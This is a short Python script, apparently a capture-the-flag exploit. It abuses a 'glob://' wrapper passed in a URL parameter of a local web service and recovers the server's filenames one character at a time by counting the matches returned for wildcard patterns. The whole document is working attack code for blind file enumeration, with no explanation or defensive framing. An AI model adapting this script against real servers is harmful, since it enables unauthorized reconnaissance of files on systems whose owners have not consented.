import string
import requests

url = "http://localhost:42068/?f=glob://"

def get_amount_of_files(glob):
    response = requests.get(url+glob)
    return len(response.text.split('\r'))-1

def main():
    amount_of_files = get_amount_of_files('*')
    print(f'Detected {amount_of_files} files')

    files = []
    filename = ''
    while len(files) < amount_of_files:
        for letter in [char for char in string.printable if char not in '*\\/?#&']:
            amount = get_amount_of_files(f'{filename}{letter}*')
            if amount > 0:
                exists = 0
                for file in files:
                    if file[:len(filename) + 1] == f'{filename}{letter}':
                        exists += 1
                if exists < amount:
                    filename += letter
                    print(f'\tFound {amount} files '+ f'{"" if amount == 1 else "s"}' + f'starting with {filename}')
                    break
        else:
            files.append(filename)
            filename = ''
    print(files)

if __name__ == '__main__':
    main()